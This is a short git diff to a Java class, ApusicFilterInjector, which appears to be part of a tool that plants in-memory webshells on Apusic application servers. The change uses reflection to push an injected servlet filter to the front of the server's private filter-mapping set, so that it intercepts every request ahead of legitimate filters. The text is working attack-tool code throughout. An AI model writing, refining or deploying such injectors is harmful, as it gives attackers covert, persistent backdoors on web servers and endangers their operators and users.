@@ -8,6 +8,7 @@ import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
+import java.util.LinkedHashSet;
 import java.util.Map;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
@@ -145,7 +146,12 @@ public class ApusicFilterInjector {
         Object filterMapping = filterMappingClass.newInstance();
         invokeMethod(filterMapping, "setUrlPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         invokeMethod(filterMapping, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
-        invokeMethod(webModule, "addBeforeFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});
+        LinkedHashSet beforeFilterMappings = (LinkedHashSet) getFieldValue(webModule, "beforeFilterMappings");
+        LinkedHashSet newSet = new LinkedHashSet();
+        newSet.add(filterMapping);
+        newSet.addAll(beforeFilterMappings);
+        beforeFilterMappings.clear();
+        beforeFilterMappings.addAll(newSet);
 
         // addFilterModel
         invokeMethod(webModule, "addFilter", new Class[]{String.class, String.class}, new Object[]{getClassName(), getClassName()});
